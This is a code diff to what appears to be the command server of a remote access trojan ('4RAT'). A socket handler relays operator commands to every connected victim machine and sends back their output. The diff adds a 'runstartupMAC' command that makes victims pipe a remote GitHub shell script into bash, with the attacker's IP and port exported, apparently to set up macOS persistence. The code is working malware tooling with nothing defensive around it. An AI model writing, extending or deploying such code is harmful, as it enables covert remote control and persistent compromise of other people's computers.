@@ -150,12 +150,16 @@ def handle_web_connect():
 @socketio.on('send_command')
 def handle_send_command(data):
     command = data['command']
-    
     for client_socket, addr in clients:
         try:
-            client_socket.sendall(f"{command}\n".encode())
-            output = client_socket.recv(4096).decode()
-            emit('command_output', {'output': output}, broadcast=True)
+            if command == "runstartupMAC":
+                
+                client_socket.sendall(f"export IP='{ratip}'; export PORT={ratport}; curl https://raw.githubusercontent.com/4lpndev/4RAT-scripts/refs/heads/main/runonstartupMACOS.sh | bash \n".encode())
+                emit('command_output', {'output': "run on startup installing for macOS..."}, broadcast=True)
+            else:
+                client_socket.sendall(f"{command}\n".encode())
+                output = client_socket.recv(4096).decode()
+                emit('command_output', {'output': output}, broadcast=True)
         except Exception as e:
             emit('command_output', {'output': f"Error executing command: {e}"})
 
